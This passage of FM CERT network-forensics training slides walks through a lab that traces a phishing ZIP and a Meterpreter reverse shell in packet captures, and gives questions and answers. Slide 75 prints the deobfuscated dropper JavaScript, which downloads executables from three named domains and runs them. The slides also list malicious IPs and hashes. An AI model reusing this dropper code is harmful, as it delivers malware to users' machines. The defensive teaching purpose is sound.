· Find By: ­ Display Filter ­ Hex value ­ String
· Search in (only for String search): ­ Packet list ­ Packet details ­ Packet bytes (this is usually what you want)
65

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Theory: ngrep

· Grep implementation for network traffic · Prints IP addresses and port numbers for matching packets · Use -q to avoid filling the screen with #'es for packets that do not match the BPF · Examples:
­ Search for email address "user@internet.se": ngrep -I dump.pcap -q user@internet.se ­ Search DNS requests for "pwned.se": ngrep -I snort.log.1428364808 -q -i pwned.se dst port 53

ngrep <-iqvx> <-IO pcap_dump > < -n num > < match expression > < bpf filter >

-i

Ignore case for the regex expression.

-q

Be quiet; don't output any information other than packet headers and their payloads (if

relevant).

-v

Invert the match; only display packets that don't match.

-I pcap_dump

Input file pcap file into ngrep.

-O pcap_dump

Output matched packets to a pcap file.

match expression

A match expression is an extended regular expression.

bpf filter

Selects a filter that specifies what packets will be dumped.

66

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Theory: Tcpflow

· Extracts TCP sessions to the current work directory · Each TCP session will generate two files (client-to-server and server-to-client) · Tip: Create a new "flow" directory for each tcpflow execution · Examples:
­ Extract POP3 emails: tcpflow -r emails.pcap port 110 ­ Extract HTTP downloads: tcpflow -AH -r web.pcap src port 80

tcpflow [-BcC] [-AH] [-b max_bytes] [-i iface] [-r file1.pcap] [expression]

-B

Force binary output even when printing to console with -C or -c.

-b

Capture no more than max_bytes bytes per flow.

-c

Console print (stdout), without storing any captured data to files

-C

Console print without the packet source and destination details being printed.

-AH Perform HTTP post-processing ("After" processing) to extract HTTP payloads.

-i

Capture packets from the network interface named iface.

-r

Read from PCAP file.

67

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Question 2.5

· Forensics of Ned's computer (192.168.0.53) indicates that the first infection was caused by a file called "Delivery_Notification_00000529832.zip", which landed on Ned's computer on 2015-04-07.

· The ZIP file has the following MD5 sum: 1f5a31b289fd222e2d47673925f3eac9

· Q2.5: How was this piece of malware delivered to Ned's computer?

(HTTP / E-mail / Chat / Other)

Proceed to Bonus

Question 2.6 when

· Recommended Tools:

finished

­ GUI way: Wireshark's Find Packet [Ctrl+F] and "Follow TCP Stream"

­ Command line way: Ngrep and Tcpflow

68

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Wireshark String Search
· [Ctrl+F] or
Edit > Find Packet · Find By String · Search in Packet bytes

69

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Wirehsark Follow TCP Stream

70

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

String Search with ngrep

user@securityonion:/nsm/sensor_data/securityonion-eth1/dailylogs/2015-04-07$ ngrep -I snort.log.1428364808 -q Delivery_Notification_00000529832.zip host 192.168.0.53
input: snort.log.1428364808
match: Delivery_Notification_00000529832.zip
T 212.227.17.187:110 -> 192.168.0.53:2206 [A]
o:p></p><div><div><div><p =..class=3DMsoNormal><span =..style=3D'font-size:9.0pt;fontfamily:"Verdana","sans-serif"'>Dear =..Krusty,<o:p></o:p></span></p></div><div><p class=3DMsoNormal><span =..style=3D'font-size:9.0pt;font-family: "Verdana","sansserif"'>&nbsp;<o:p><=../o:p></span></p></div><div><p class=3DMsoNormal><span =..style=3D'fontsize:9.0pt;font-family:"Verdana","sans-serif"'>This is to =..confirm that one or more of your parcels has been shipped.<br >Please, =..download Delivery Label attached to this =..email.<o:p></o:p></span></p></div><div><p class=3DMsoNormal><span =..style=3D'fontsize:9.0pt;font-family:"Verdana","sans-serif"'>Thank you =..for choosing FedEx,<br>Darren Par ks,<br>Sr. Station=..Manager.<o:p></o:p></span></p></div></div></div></div></body></html>..-----=_NextPart_001_00CB_01D07147.7F6B4EA0--....-----=_NextPart_000_00CA_01D07147.7F6B4EA0..Content-Type: application/zip;...name="Deliver y_Notification_00000529832.zip"..Content-Transfer-Encoding: base64..ContentDisposition:attachment;...filename="Delivery_Notification_00000529832.zip"....UEsDBBQAAAAIAHOrf kYGeZ09ohAAAFBRAAAoAAAARGVsaXZlcnlfTm90aWZpY2F0aW9uXzAwMDAw. .NTI5ODMyLmRvYy5qc4Vc74/bNhL9VwQDTbzd1PVum2tze3uH/kjvPlzQoglwBYrCkCXa1laWHEn2..2in2 fz8OOaQo8Y22H9LEtsYUOfPmzZuRT2mTPD4+3s9e03+3r98ub27+tvxx+dPX3y1/WOp/Lb9d..vrm5pVdu v15+tXyzfK3//q1+95vl98s3s7vNscq6oq6S1art0nWpVquiOqVlka9Wx0OedqpZrQ5 N..fZhfJ

71

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

tcpflow
· Create and "cd" into a new directory · Run tcpflow
­ tcpflow -r /nsm/sensor_data/securityonion-eth1/dailylogs/201504-07/snort.log.1428364808 host 212.227.17.187 and port 110 and host 192.168.0.53 and port 2206
· Remove everything but the base64 encoded zip · Base64-decode the file
­ base64 -d -i 212.227.017.187.00110-192.168.000.053.02206 > decoded.zip
· Hash it:
­ md5sum decoded.zip 1f5a31b289fd222e2d47673925f3eac9 decoded.zip

72

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Answer 2.5
· A2.5: Delivery_Notification_00000529832.zip was delivered via an email (POP3) from Krusty.
· The extracted attachment's MD5 was: 1f5a31b289fd222e2d47673925f3eac9

73

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Bonus Solution: Xplico https://127.0.0.1:9876/

74

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Bonus Question 2.6
· Deobfuscate the JavaScript contained in Delivery_Notification_00000529832.doc.js. zip
· Q2.6: What domains does the JavaScript download additional malware from?

75

FM CERT

Deobfuscated Malware

2015-04-30

WWW.FORSVARSMAKTEN.SE

Delivery_Notification_00000529832.doc.js deobfuscated:
var www="5555525E01160D0F4A0C0E010809120D0F240309050D084A070B09"; function dl(fr) {
var b = "www.mybusinessdoc.com nursealarmsystems.com carina-paris-hotel.com".split(" "); for (var i = 0; i < b.length; i++) {
var ws = new ActiveXObject("WScript.Shell"); var fn = ws.ExpandEnvironmentStrings("%TEMP%") + String.fromCharCode(92) + Math.round(Math.random() * 100000000) + ".exe"; var dn = 0; var xo = new ActiveXObject("MSXML2.XMLHTTP"); xo.onreadystatechange = function() {
if (xo.readyState == 4 && xo.status == 200) { var xa = new ActiveXObject("ADODB.Stream"); xa.open(); xa.type = 1; xa.write(xo.ResponseBody); if (xa.size > 5000) { dn = 1; xa.position = 0; xa.saveToFile(fn, 2); try { ws.Run(fn, 1, 0); } catch (er) {}; }; xa.close();
}; }; try {
xo.open("GET", "http://" + b[i] + "/document.php?rnd=" + fr + "&id=" + www, false); xo.send(); } catch (er) {}; if (dn == 1) break; } }; dl(3271); dl(5292); dl(9813);

76

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Answer 2.6

Malware Download Domains

68.164.182.11 216.47.227.188 209.59.156.160

www.mybusinessdoc.com nursealarmsystems.com carina-paris-hotel.com

$ racluster -R * -n -w - -- host 68.164.182.11 or 216.47.227.188 or 209.59.156.160 | rasort -m stime -s stime saddr sport daddr dport pkts

StartTime

SrcAddr Sport

DstAddr Dport TotPkts

2015-04-07 13:34:43 192.168.0.53.2210 68.164.182.11.80

583

2015-04-07 13:34:48 192.168.0.53.2211 216.47.227.188.80

8

2015-04-07 13:34:49 192.168.0.53.2212 209.59.156.160.80

12

77

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Question 2.7

· Q2.7: What binaries were dropped by Delivery_Notification_00000529832.doc.js on April 7? MD5 sums wanted!

· Tip 1: The download script uses a unique QueryString parameter: 5555525E01160D0F4A0C0E010809120D0F240309050D084A070B09

· Tip 2: The script uses hard coded domains: www.mybusinessdoc.com

(68.164.182.11), nursealarmsystems.com (216.47.227.188) and carina-

paris-hotel.com (209.59.156.160)

· Recommended Tools (any of these will work):
­ Wireshark
· Display filter: http.request.uri contains 5555525E...

Proceed to Bonus Questions 3.* when
finished!

· Select downloaded file + Export Selected Bytes

­ Tcpdump (filter on IP addresses) and NetworkMiner (Files tab)

­ Ngrep/Tshark and tcpflow

­ Bro logs (/nsm/bro/logs/2015-04-07/)

78

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Wireshark: Export Selected Bytes

79

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

NetworkMiner File Extraction

80

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

File types and MD5 sums
find /opt/networkminer/AssembledFiles/ -name "*.gif" -exec file {} \; -exec md5sum {} \; /opt/networkminer/AssembledFiles/68.164.182.11/HTTP - TCP 80/c87ed3c.gif: PE32 executable (console) Intel 80386, for MS Windows de3d95855cbe959385a558458947d746 /opt/networkminer/AssembledFiles/68.164.182.11/HTTP - TCP 80/c87ed3c.gif /opt/networkminer/AssembledFiles/68.164.182.11/HTTP - TCP 80/f7.gif: PE32 executable (GUI) Intel 80386, for MS Windows d48ef4bb0549a67083017169169ef3ee /opt/networkminer/AssembledFiles/68.164.182.11/HTTP - TCP 80/f7.gif /opt/networkminer/AssembledFiles/68.164.182.11/HTTP - TCP 80/551d88323f7e.gif: PE32 executable (GUI) Intel 80386, for MS Windows 634c2a2a3ab03d5c21730c62d4677fe8 /opt/networkminer/AssembledFiles/68.164.182.11/HTTP - TCP 80/551d88323f7e.gif /opt/networkminer/AssembledFiles/216.47.227.188/HTTP - TCP 80/d373f76161148868.gif: PE32 executable (GUI) Intel 80386, for MS Windows d48ef4bb0549a67083017169169ef3ee /opt/networkminer/AssembledFiles/216.47.227.188/HTTP - TCP 80/d373f76161148868.gif /opt/networkminer/AssembledFiles/209.59.156.160/HTTP - TCP 80/af99a8a3e.gif: PE32 executable (GUI) Intel 80386, for MS Windows d48ef4bb0549a67083017169169ef3ee /opt/networkminer/AssembledFiles/209.59.156.160/HTTP - TCP 80/af99a8a3e.gif

81

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Answer 2.7
· A2.7: Downloaded files were the same ones as those found with the whitelist filtering approach:
­ c87ed3c.gif (MZ file)
· MD5: de3d95855cbe959385a558458947d746
­ 551d88323f7e.gif (MZ file)
· MD5: 634c2a2a3ab03d5c21730c62d4677fe8
­ f7.gif / d373f76161148868.gif / af99a8a3e.gif (MZ files)
· MD5: d48ef4bb0549a67083017169169ef3ee

82

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Answer 2.7
· A2.7: Downloaded files were the same ones as those found with the whitelist filtering approach:
­ c87ed3c.gif (MZ file)
· MD5: de3d95855cbe959385a558458947d746
­ 551d88323f7e.gif (MZ file)
· MD5: 634c2a2a3ab03d5c21730c62d4677fe8
­ f7.gif / d373f76161148868.gif / af99a8a3e.gif (MZ files)
· MD5: d48ef4bb0549a67083017169169ef3ee

83

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

84

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Bonus Incident #3: APT4711

· APT4711 send a spear phishing email to Krusty (192.168.0.54) on March 18.
· Note: Krusty uses SSL encrypted IMAP (TCP 993) towards imap.google.com, so we cannot inspect the contents of his email. However, we do know that Krusty opened the attachment at 10.35.36 UTC, which caused a Command-and-control (C2) software do be downloaded.

85

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Bonus Question 3.1
· Q3.1: From what IP and TCP port was the C2 software downloaded?

86

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Whitelist Filtering with Argus

user@securityonion:/nsm/sensor_data/securityonion-eth1/argus$ rafilteraddr -r 2015-03-18.log -v -f /usr/local/etc/ip_whitelist.txt -w - -- host 192.168.0.54 and dst net not 192.168.0.0/16 | racluster -w - | rasort -m stime -n | grep "10:35:"

2015-03-18 10:35:39 tcp 192.168.0.54.50100 -> 103.10.197.187.2703 129 4468 81497

2015-03-18 10:35:39 udp 192.168.0.54.61537 -> 224.0.0.252.5355

2

128

0

2015-03-18 10:35:45 tcp 192.168.0.54.50101 -> 103.10.197.187.2702 1141 35562 801283

87

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Answer 3.1
· A3.1: 103.10.197.187 TCP 2703

88

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Bonus Question 3.2
· Q3.2: What type of C2 channel was established from Krusty's computer to a server in Hong Kong after the C2 software was downloaded and executed?

89

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Follow TCP Stream of Meterpreter

90

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Answer 3.2

· A: Meterpreter reverse shell to 103.10.197.187 on TCP 2702 (from for example TCP 49239 on 2015-03-19)

The actual format of the TLV structure that meterpreter uses is:

0

1

2

3

0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

|

Length

|

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

|

Type

|

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

|

|

|

... Value ...

|

|

|

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

Length (32 bits, network byte order): The length field contains the length

of the TLV including the Length, Type and Value fields.

Type (32 bits, network byte order): The type field holds the arbitrary data

type which is used to indicate the format of the value.

Value (0..n bits): The value field holds arbitrary data that is of the

format specified in the Type field.

Source: https://dev.metasploit.com/document9s1/meterpreter.pdf

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Super Extra Bonus Questions
· Q3.3: Krusty's computer (.54) has been infected with some "badware", when did this happen and how?
· Q3.4: Extract all emails sent with SMTP (NetworkMiner)
· Q3.5: List all long running sessions (Argus) · Q3.6: Look for data exfiltration, i.e. large
amounts of outbound data transfers (Argus)

92

FM CERT

2015-04-30

WWW.FORSVARSMAKTEN.SE

Usernames / Passwords
· Security Onion VM
­ user / password
· ELSA : https://127.0.0.1/elsa/
­ user / password
· Squert : https://127.0.0.1/squert/
­ user / password
· Snorby : https://127.0.0.1:444/
­ user@internet.se / password
· Xplico : https://127.0.0.1:9876/
­ xplico / xplico

93

FM CERT

